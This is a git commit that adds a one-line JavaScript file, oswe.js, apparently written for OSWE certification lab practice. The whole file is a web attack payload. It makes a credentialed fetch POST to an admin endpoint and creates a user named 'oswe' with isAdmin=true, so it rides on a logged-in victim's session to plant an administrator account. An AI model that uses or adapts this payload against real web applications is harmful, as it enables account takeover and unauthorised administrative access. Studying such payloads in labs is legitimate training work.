169e31e067416a9a2bf0d67987e1045e7e263204
Cristian <56600729+deep-know@users.noreply.github.com>
2024-05-08 17:49:47 -0500

    Create oswe.js

---
+++ oswe.js
@@ -0,0 +1,1 @@
+fetch(`http://answers/admin/users/create`,{method:`POST`,body:`username=oswe%26email=test@oswe.com%26isAdmin=true`,credentials:`include`,headers:{'Content-Type':'application/x-www-form-urlencoded'}})
